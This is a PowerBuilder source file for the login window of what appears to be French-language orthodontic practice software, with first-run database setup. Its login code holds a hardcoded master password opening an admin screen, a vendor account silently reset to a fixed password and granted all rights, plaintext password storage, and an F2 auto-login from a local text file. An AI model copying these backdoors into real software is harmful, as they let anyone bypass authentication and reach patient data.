$PBExportHeader$w_password_logon.srw
forward
global type w_password_logon from window
end type
type st_info from statictext within w_password_logon
end type
type sle_password from singlelineedit within w_password_logon
end type
type st_label from statictext within w_password_logon
end type
type cb_ok from commandbutton within w_password_logon
end type
type cb_annuler from commandbutton within w_password_logon
end type
end forward

global type w_password_logon from window
integer x = 1161
integer y = 904
integer width = 1088
integer height = 536
windowtype windowtype = response!
long backcolor = 134217752
string pointer = "Arrow!"
boolean center = true
st_info st_info
sle_password sle_password
st_label st_label
cb_ok cb_ok
cb_annuler cb_annuler
end type
global w_password_logon w_password_logon

type variables

end variables

forward prototypes
public function boolean validpass (string f_pass)
public subroutine initstart ()
public function integer of_initialvalue (classdefinition a_class, string as_property, ref any aa_value)
public subroutine of_ajoutdroit (classdefinition a_class, string as_name)
public function string of_getdesc (classdefinition a_class)
end prototypes

public function boolean validpass (string f_pass);//
////verif si ortho
//select ortho_id, dr_special, dr_nom_complet into :v_no_ortho, :gs_drspecial, :gs_user from ortho_id where password = :f_pass;
//if v_no_ortho > 0 then
//	v_langue = 'fr'
//	if isnull(g_typepass) = false and g_typepass <> '' and isnull(v_no_ortho) = false and v_no_ortho <> 0 and isnull(gs_user) = false then
		return true
//	else
//		return false
//	end if
//else
//	//verif si personnel
//	select ortho_id, initial, langue into :v_no_ortho, :gs_user, :v_langue from t_personnels where password = :f_pass;
//	if v_no_ortho > 0 then
//		g_typepass = 'user'
//		if isnull(v_langue) then v_langue = 'fr'
//		select dr_special into :gs_drspecial from ortho_id where ortho_id = :v_no_ortho;
//		if isnull(g_typepass) = false and g_typepass <> '' and isnull(v_no_ortho) = false and v_no_ortho <> 0 and isnull(gs_user) = false then
//			return true
//		else
//			return false
//		end if
//	else
//		return false
//	end if
//end if
end function

public subroutine initstart ();int li_check
dec{7} ld_check
string ls_trait,ls_check

if v_langue = 'an' then
	ls_trait = 'None'
else
	ls_trait = 'Aucun'
end if

//t_color premier demarrage
select count(*) into :li_check from t_color where ortho_id = :v_no_ortho;
if li_check = 0 then
	insert into t_color (name,color,ortho_id,hor,spec) values ('Blanc',16777215,:v_no_ortho,1,1);
end if
select count(*) into :li_check from t_color where hor = 1 and ortho_id = :v_no_ortho;
if li_check = 0 then
	update t_color set hor = 1 where color = 16777215 and ortho_id = :v_no_ortho;
end if
//type de traitement premier demarrage
SetNull(li_check)
//select type_traitement_id into :li_check from type_de_traitement where ortho_id = :v_no_ortho and nom_traitement = :ls_trait;
//if li_check <> 1 or isnull(li_check) then
select count(*) into :li_check from type_de_traitement where ortho_id = :v_no_ortho and type_traitement_id = 1;
if li_check = 0 then
	insert into type_de_traitement (nom_traitement,color_id,ortho_id,type_traitement_id,rap) values (:ls_trait,1,:v_no_ortho,1,1);
else
	update type_de_traitement set nom_traitement = :ls_trait, color_id = 1, nip_traitement = '', rap = 1 where ortho_id = :v_no_ortho and type_traitement_id = 1;
	commit;
end if
//select count(*) into :li_check from type_de_traitement where ortho_id = :v_no_ortho and type_traitement_id = 0;
//if li_check = 0 then
////	insert into type_de_traitement (nom_traitement,color_id,ortho_id,traittype,rap,addtocharge) values ('Adjust',1,:v_no_ortho,0,0,1);
//	insert into type_de_traitement (nom_traitement,color_id,ortho_id,type_traitement_id,rap,addtocharge) values ('Adjust',1,:v_no_ortho,0,0,1);
//	error_type(-1)
//end if
//end if
//t_options
select count(*) into :li_check from t_options where ortho_id = :v_no_ortho;
if li_check = 0 then
	insert into t_options (mes_cpd,mes_facture,facture_consulte,rapidsearch,hor_depart_am,hor_depart_pm,hor_fin_am,hor_fin_pm,hor_step,hor_aff_pm,horcolor,recuimpnue,horimpaff,ortho_id) VALUES (0,0,0,0,7,13,13,18,10,1,0,0,1,:v_no_ortho);
end if
select horcolnb into :li_check from t_options where ortho_id = :v_no_ortho;
if not li_check > 0 or isnull(li_check) then
	update t_options set horcolnb = 5 where ortho_id = :v_no_ortho;
end if
select horshareid into :li_check from t_options where ortho_id = :v_no_ortho;
if not li_check > 0 or isnull(li_check) then
	update t_options set horshareid = :v_no_ortho where ortho_id = :v_no_ortho;
end if
SELECT t_options.noTrans INTO :ld_check FROM t_options WHERE ortho_id = :v_no_ortho;
if isnull(ld_check) then
	UPDATE t_options SET noTrans = 50000 WHERE ortho_id = :v_no_ortho;
end if
SELECT t_options.somdepot INTO :ls_check FROM t_options WHERE ortho_id = :v_no_ortho;
if isnull(ls_check) then
	UPDATE t_options SET somdepot = '1' WHERE ortho_id = :v_no_ortho;
end if
//sync horaire
delete from t_horlogrefresh where date(updateheure) < today();
//initialisation des statuts premier demarrage
select count(*) into :li_check from t_status;
if li_check = 0 then
	insert into t_status (code,description,affect,ortho_id,ordrepaie) VALUES ('mens','mens',1,:v_no_ortho,1);
end if
//type de rappel, le type rvm doit etre egale au no_ortho
select count(*) into :li_check from t_raptrait where ortho_id = :v_no_ortho and id_raptrait = -1;
if li_check = 0 then
	insert into t_raptrait (nom,ortho_id,id_raptrait,defo) VALUES ('Rendez-vous manqué',:v_no_ortho,-1,0);
end if
//type de rappel, le type rvc doit etre egale au no_ortho + 1
select count(*) into :li_check from t_raptrait where ortho_id = :v_no_ortho and id_raptrait = -2;
if li_check = 0 then
	insert into t_raptrait (nom,ortho_id,id_raptrait,defo) VALUES ('Rendez-vous annulé',:v_no_ortho,-2,0);
end if
//t_phase
select count(*) into :li_check from t_phase where ortho_id = :v_no_ortho;
if li_check = 0 then
	insert into t_phase(phase,defo,ortho_id) values('Phase',1,:v_no_ortho);
end if
//t_etiqchoix
select count(*) into :li_check from t_etiqchoix where ortho_id = :v_no_ortho;
if li_check = 0 then
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1,refdw2,refdw3,refdw4,refdw5) 
	values('Étiquettes dossier',0,:v_no_ortho,'d_etiquettes_1','d_etiquettes_2','d_etiquettes_3','d_etiquettes_4','d_etiquettes_5');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Étiquettes dossier (1)',0,:v_no_ortho,'d_etiquettes_dossier_1');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1,refdw2,refdw3,refdw4,refdw5) 
	values('Étiquettes dossier (#pat.)',0,:v_no_ortho,'d_etiquettenopatient1','d_etiquettenopatient2','d_etiquettes_3','d_etiquettenopatient4','d_etiquettenopatient5');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Étiquette patient',0,:v_no_ortho,'d_etiquette_patient');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Étiquette responsable',0,:v_no_ortho,'d_etiquettes_responsable');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Étiquette référent',0,:v_no_ortho,'d_etiquettes_referents1');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Pochette',0,:v_no_ortho,'d_etiquettes_pochette');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Modèle',0,:v_no_ortho,'d_etiquette_modele');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Panorex et ceph',0,:v_no_ortho,'d_etiquettes_panorex_ceph');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Panorex et ceph (1)',0,:v_no_ortho,'d_etiquettes_panorex_ceph_1');
//	insert into t_etiqchoix(etiqnom,choix,ortho_id) values('Panorex et ceph (2)',0,:v_no_ortho);
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1,refdw2) 
	values('Consultation',0,:v_no_ortho,'d_etiquettes_5','d_etiquettes_6');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Patient Nom',0,:v_no_ortho,'d_etiquettes_patnom');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1,refdw2) values('Patient Rec',0,:v_no_ortho,'d_etiquettes_patrec','d_etiquettes_patrec');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1,refdw2,refdw3) values('Patient Rec (3)',0,:v_no_ortho,'d_etiquettes_patrec','d_etiquettes_patrec','d_etiquettes_patrec');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1,refdw2) values('Patient Final Rec',0,:v_no_ortho,'d_etiquettes_patrecfinal','d_etiquettes_patrecfinal');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Modèle(1)',0,:v_no_ortho,'d_etiquettes_modele');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Initial',0,:v_no_ortho,'d_etiquettesinitial1');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1,refdw2) values('Initial (2)',0,:v_no_ortho,'d_etiquettesinitial','d_etiquettesinitial1');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Modèle(2)',0,:v_no_ortho,'d_etiqmodele2');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Modèle(4)',0,:v_no_ortho,'d_etiquettesmodele4');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Étiquette (4)',0,:v_no_ortho,'d_etiquettes_modele4');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Modèle(4 courte)',0,:v_no_ortho,'d_etiquettesmodele4court');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Modèle patient (4)',0,:v_no_ortho,'d_etiquettespatient4');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Étiq. consultation',0,:v_no_ortho,'d_etiqconsult');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Étiq. contrôle',0,:v_no_ortho,'d_etiqcontrol');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Étiq. finals',0,:v_no_ortho,'d_etiqfinals');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Étiq. duplicata',0,:v_no_ortho,'d_etiqdup');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Étiq. records',0,:v_no_ortho,'d_etiqrecords');
	insert into t_etiqchoix(etiqnom,choix,ortho_id,refdw1) values('Étiq. patient petit',0,:v_no_ortho,'d_etiqpatsmall');
end if
//init
select photo into :gi_photo from t_options where ortho_id = :v_no_ortho;

//init serial printer
//if FileExists (gnv_app.of_getAppIniFile()) then
//	if gf_orthoini('printer', 'UniqueId', '', false) = '' then
//		gf_orthoini('printer', 'UniqueId', string(gl_serial), true)
//	end if
//else
//	gf_orthoini('printer', 'UniqueId', string(gl_serial), true)
//end if
end subroutine

public function integer of_initialvalue (classdefinition a_class, string as_property, ref any aa_value);//////////////////////////////////////////////////////////////////////////////
//	Function:			of_InitialValue
//	Description:		Scan a class definitions variablelist looking for a property,
//						If found Then return the property's value
//////////////////////////////////////////////////////////////////////////////
long		ll_idx, ll_cnt

SetPointer ( HourGlass! )

as_property = Trim ( Lower ( as_property ) )

// get the variables from the class definition
ll_cnt = UpperBound ( a_class.VariableList ) 
For ll_idx = 1 To ll_cnt
	If as_property = a_class.VariableList[ll_idx].Name Then
		// found - so return success
		aa_value = a_class.VariableList[ll_idx].InitialValue
		Return 1 
	End If
Next

// variable not found so return error
Return -1
end function

public subroutine of_ajoutdroit (classdefinition a_class, string as_name);//////////////////////////////////////////////////////////////////////////////
//	Function:		of_AjoutDroit
//	Description:  	Parcours le menu principal et donne tous les accès à l'utilisateur Progitek.
//////////////////////////////////////////////////////////////////////////////
long ll_cnt, ll_idx, ll_hndl
string ls_name
n_cst_string lnv_str
any la_initial

SetPointer(HourGlass!)

if not isValid(a_class) then return
if of_initialValue(a_class, "tag", la_initial) = 1 then
	if string(la_initial) = "invisible" then return
end if
//ls_name = of_getDesc(a_class)
//if as_name <> "" and (lnv_str.of_isFormat(ls_name) or ls_name = "") then return

// get the class it self
ls_name = a_class.name
ls_name = Mid(ls_name, Pos(ls_name, "`" ) + 1)
ls_name = as_name + ls_name

select count(*) into :ll_cnt from t_persdroits where id_personnel = 0 and objet = :ls_name;

if ll_cnt = 0 then
	insert into t_persdroits values (0, :ls_name);
	error_type(-1)
end if

// see how many objects to be scaned
ll_cnt = UpperBound(a_class.NestedClassList)
// get the controls on the object
For ll_idx = 1 To ll_cnt
	of_ajoutDroit(a_class.NestedClassList[ll_idx], ls_name + ".")
Next

end subroutine

public function string of_getdesc (classdefinition a_class);//////////////////////////////////////////////////////////////////////////////
//	Function:				of_GetDesc
//	Description:  		Return additional information about an object. 
//				     		Look for text attribute
//////////////////////////////////////////////////////////////////////////////
long ll_idx, ll_cnt, ll_pos
string ls_desc, ls_piece1, ls_piece2, ls_value
string	ls_script[]
n_cst_string lnv_string

SetPointer(HourGlass!)
// get the variables from the class definition
// for a menu, the attributes are set in the create script
ll_cnt = UpperBound(a_class.ScriptList)
For ll_idx = 1 To ll_cnt
	If a_class.ScriptList[ll_idx].Name = "create" Then
		// found - so return success
		ls_value = a_class.ScriptList[ll_idx].Source
		Exit
	End If
Next

// check to see if we have anything to parse
If ls_value = "" Then Return ""
lnv_string.of_ParseToArray ( ls_value, "~r~n", ls_script)
ll_cnt = UpperBound(ls_script)
For ll_idx = 1 to ll_cnt
	If Pos(Lower(ls_script[ll_idx]), "this.text") > 0 Then
		ls_desc = lnv_string.of_GetKeyValue(ls_script[ll_idx], "this.text", "=")
		If ls_desc <> "" Then Exit
	End If
Next

If ls_desc <> "" Then
	ls_desc = lnv_string.of_GlobalReplace(ls_desc, "~"", "")
	ls_desc = lnv_string.of_GlobalReplace(ls_desc, "~~'", "'")
	ll_pos = Pos(ls_desc, "&&")
	If ll_pos > 0 Then
		ls_piece1 = Mid(ls_desc, 1, ll_pos - 1)
		ls_piece2 = Mid(ls_desc, ll_pos)
		ls_piece1 = lnv_string.of_GlobalReplace(ls_piece1, "&", "")
		ls_piece2 = lnv_string.of_GlobalReplace(ls_piece2, "&", "")
		ls_desc = ls_piece1 + "&" + ls_piece2
	Else
		ls_desc = lnv_string.of_GlobalReplace(ls_desc, "&", "")
	End If
	ll_pos = Pos(ls_desc, "~~t")
	If ll_pos > 0 Then
		ls_desc = Mid(ls_desc, 1, ll_pos - 1)
	End If
End If

Return ls_desc
end function

on w_password_logon.create
this.st_info=create st_info
this.sle_password=create sle_password
this.st_label=create st_label
this.cb_ok=create cb_ok
this.cb_annuler=create cb_annuler
this.Control[]={this.st_info,&
this.sle_password,&
this.st_label,&
this.cb_ok,&
this.cb_annuler}
end on

on w_password_logon.destroy
destroy(this.st_info)
destroy(this.sle_password)
destroy(this.st_label)
destroy(this.cb_ok)
destroy(this.cb_annuler)
end on

event open;int li_check = 0

li_check = 0

select count(*) into :li_check from ortho_id;
if li_check = 0 then
	close(w_password_logon)
	w_etat.setfocus()
	w_etat.new_ortho()
else
	any la_menu
	classDefinition lobj_class

	//il doit y avoir au moin une ligne ds t_personnel id = 0
	select count(*) into :li_check from t_personnels where id_personnel = 0;
	if li_check = 0 then
		insert into t_personnels (id_personnel,initial,nom,prenom,adresse,ville,province,zip,postocc,password,ortho_id,langue) values (0,'PRO','Progitek','','2323 Versant Nord #204','Quebec','Quebec','G1N 4P4','a','progitekde',1,'fr');
		error_type(-1)
	end if
	
	lobj_class = findClassDefinition("w_principal")
	if isValid(lobj_class) then
		if of_initialValue(lobj_class, "menuname", la_menu) = 1 then
			lobj_class = findClassDefinition(string(la_menu))
			of_ajoutdroit(lobj_class, "")
		end if
	end if
	
	//insertion du mot de passe automatique
	sle_password.text = message.stringparm
	sle_password.setfocus()
	//securite registration
	int v_compteur
	select compteur into :v_compteur from lock_cheques;
	if v_compteur < 3000 then
		st_info.visible = true
		if v_langue = 'fr' then
			st_info.text="Nombre de jours restant:"+string(v_compteur)
		else
			st_info.text="Number of days remainning:"+string(v_compteur)
		end if
	else
		st_info.visible = false
	end if
end if

end event

type st_info from statictext within w_password_logon
integer x = 32
integer y = 8
integer width = 987
integer height = 64
integer textsize = -10
integer weight = 400
fontcharset fontcharset = ansi!
fontpitch fontpitch = variable!
fontfamily fontfamily = swiss!
string facename = "Arial"
long backcolor = 134217752
boolean enabled = false
boolean focusrectangle = false
end type

type sle_password from singlelineedit within w_password_logon
event ue_keypress pbm_keydown
integer x = 32
integer y = 228
integer width = 987
integer height = 84
integer taborder = 10
integer textsize = -12
integer weight = 400
fontcharset fontcharset = ansi!
fontpitch fontpitch = variable!
fontfamily fontfamily = swiss!
string facename = "Arial"
string pointer = "Arrow!"
long textcolor = 16711680
boolean autohscroll = false
boolean password = true
textcase textcase = lower!
borderstyle borderstyle = stylelowered!
end type

event ue_keypress;IF KeyDown(KeyF2!) THEN
	integer 	li_FileNum
	string 	ls_nom, ls_pass

	IF FileExists("C:\ii4net\pass.txt") THEN
		li_FileNum = FileOpen("C:\ii4net\pass.txt", LineMode!)
		FileRead(li_FileNum, ls_pass)
		FileClose(li_FileNum)
	
	
		sle_password.text = ls_pass
		cb_ok.TriggerEvent(Clicked!)
	END IF
END IF
end event

type st_label from statictext within w_password_logon
integer x = 50
integer y = 116
integer width = 1115
integer height = 76
integer textsize = -10
integer weight = 700
fontcharset fontcharset = ansi!
fontpitch fontpitch = variable!
fontfamily fontfamily = swiss!
string facename = "Arial"
string pointer = "Arrow!"
long backcolor = 134217752
boolean enabled = false
string text = "Entrez votre code d~'identification"
boolean focusrectangle = false
end type

event constructor;if v_langue = 'an' then
	st_label.text = 'Enter your identification code'
end if
end event

type cb_ok from commandbutton within w_password_logon
integer x = 9
integer y = 364
integer width = 498
integer height = 88
integer taborder = 20
integer textsize = -10
integer weight = 700
fontcharset fontcharset = ansi!
fontpitch fontpitch = variable!
fontfamily fontfamily = swiss!
string facename = "Arial"
string pointer = "Arrow!"
string text = "Ok"
boolean default = true
end type

event clicked;/////////////////////////////////////////////
//
// Date			:	18-08-2005
//	Par			:	Eric Vezina ing.
//	Description	:	3 types d'autentification,
//						God
//						admin
//						user
//
/////////////////////////////////////////////

string v_password, ls_nom, ls_prenom
int v_check

update t_personnels set password = '!pr0g1+3k' where id_personnel = 0;
error_type(-1)

// God
if sle_password.text = 'ii4pro' then
	open(w_security_admin)
//elseif sle_password.text = 'logs' then
//	open(w_logs)
else
	if len(sle_password.text) > 0 then
		select id_personnel,langue,ortho_id into :gl_idpers,:v_langue,:v_no_ortho from t_personnels where password = :sle_password.text;
		
		gnv_app.of_setlangue(v_langue)
		
		if gl_idpers >= 0 then
			initstart()
			close(parent)
			w_etat.sle_status.text = 'Password accepted'
			
			open(w_principal)
			gw_frame = w_principal
			gnv_app.inv_messagerie.of_setwindow(gw_frame)
			gnv_app.inv_messagerie.of_setuser(gl_idpers)
			SELECT prenom, nom
			INTO :ls_prenom, :ls_nom
			from t_personnels
			WHERE id_personnel = :gl_idpers
			USING SQLCA;

			IF IsNull(ls_prenom) THEN 
				ls_prenom = ""
			ELSE
				//Ajouter l'Espace
				ls_prenom += " "
			END IF
			
			IF IsNull(ls_nom) THEN ls_nom = ""
			
	//		is_nom = "%" + ls_prenom + ls_nom + "%"
			gnv_app.inv_messagerie.of_setnomuser("%" + trim( trim(ls_prenom) + " " + trim(ls_nom)) + "%")
		else
			messagebox ("Avertissement!","Le mot de passe est éronné",Information!,OK!)
		end if
	else
		messagebox ("Avertissement!","Veuillez entrer un mot de passe.",Information!,OK!)
	end if
end if

end event

type cb_annuler from commandbutton within w_password_logon
integer x = 558
integer y = 364
integer width = 489
integer height = 88
integer taborder = 30
integer textsize = -10
integer weight = 700
fontcharset fontcharset = ansi!
fontpitch fontpitch = variable!
fontfamily fontfamily = swiss!
string facename = "Arial"
string pointer = "Arrow!"
string text = "Annuler"
boolean cancel = true
end type

event clicked;int v_compteur, v_days , v_decompte
date v_flag
string v_serie

//serurite registration
select no_serie into :v_serie from lock_cheques;

if v_serie ='P2000-00000-00000' then
	select flag into :v_flag from lock_cheques;
	select compteur into :v_compteur from lock_cheques;
	v_days=abs(DaysAfter(v_flag, today()))
	v_decompte = v_compteur + v_days
	update lock_cheques set compteur=:v_decompte;
	commit using SQLCA;
end if
close(parent)
close(w_etat)
end event

event constructor;if v_langue = 'an' then
	cb_annuler.text = 'Cancel'
end if
end event

